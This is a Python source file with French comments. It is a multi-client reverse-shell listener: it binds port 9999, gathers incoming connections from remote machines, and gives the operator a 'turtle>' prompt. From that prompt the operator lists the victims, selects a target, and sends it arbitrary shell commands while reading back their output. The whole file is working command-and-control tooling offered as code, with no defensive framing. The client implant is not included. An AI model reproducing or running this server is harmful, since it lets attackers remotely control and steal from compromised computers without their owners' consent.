import socket
from queue import Queue

import sys
import threading
import time

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connection = []
all_address = []



# Créer une connection entre 2 appareils
def create_socket():
    try:
        # declare variables
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as message:
        print("Erreur!!! Création du socket réfusé: {}".format(str(message)))


# lier la socket et écouter la connexion
def binding_socket():
    try:
        global host
        global port
        global s

        print("Binding Port: {}".format(str(port)))
        s.bind((host, port))
        s.listen(5)

    except socket.error as message:
        print("Socket Binding error {}\nRetrying!!!".format(str(message)))
        binding_socket()

# ENvoi de la command à un autrui
def send_command(connect):
    while True:
        cmd = input("")
        if cmd == "quit":
            connect.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            connect.send(str.encode(cmd))
            client_response = str(connect.recv(1024), "utf-8")
            print(client_response, end="")

# Connection from multiple clients and save list
# closing previous connection
def accepting_connection():
    for c in all_connection:
        c.close()
    del all_connection[:]
    del all_address[:]

    while True:
        try:
            connect, address = s.accept()

            # prevent timeout
            s.setblocking(1)

            all_connection.append(connect)
            all_address.append(address)

            print("Connection etabli avec succès: {}".format(address[0]))

        except:
            print("Error! Connection refusée")



# Etablir une connexion avec un client(la prise doit être ecouter
def accept_socket():
    connect, address = s.accept()

    print("Connection etabli! | IP {} | Port {}.".format(address[0], str(address[1])))

    send_command(connect)

    connect.close()


"""
    ** Afficher tous les clients
    ** Selectionnner un client
    ** Envoyer des commandes à un client connecté
    ** Prompte interactivité pour les commandes envoyées
    ** Générer un turtle( turtle> )
"""
def turtle_start():
    while True:
        cmd = input("turtle> ")
        if cmd == "list":
            list_connected()
        elif "select" in cmd:
            connect = get_target(cmd)
            if connect is not None:
                send_target_command(connect)
        else:
            print("Commande inconnue!!!")

# Display all connected
def list_connected():
    result = ""

    for i, connect in enumerate(all_connection):
        try:
            connect.send(str.encode(" "))
            connect.recv(20480)
        except:
            del all_connection[i]
            del all_address[i]

            continue

        result = "{}    {}    {}\n".format(str(i), str(all_address[i][0]), str(all_address[i][1]))

    print("------------- Clients -------------\n{}".format(result))

# Selectionnez la cible
def get_target(cmd):

    try:
        # cible = id
        target = cmd.replace("select ", '')
        target = int(target)
        connect = all_connection[target]
        print("Vous êtes connecté à IP: {}".format(str(all_address[target][0])))
        print("{}$".format(str(all_address[target][0])), end="")

        return connect
    except:
        print("Invalid selection")

        return None

# Command
def send_target_command(connect):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break

            if len(str.encode(cmd)) > 0:
                connect.send(str.encode(cmd))
                client_response = str(connect.recv(1024), "utf-8")
                print(client_response, end="")
        except:
            print("Erreur d'envoi de command")
            break


# Create threads workers
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# create work()
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            binding_socket()
            accepting_connection()
        if x == 2:
            turtle_start()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()








def main():
    create_workers()
    create_jobs()

main()

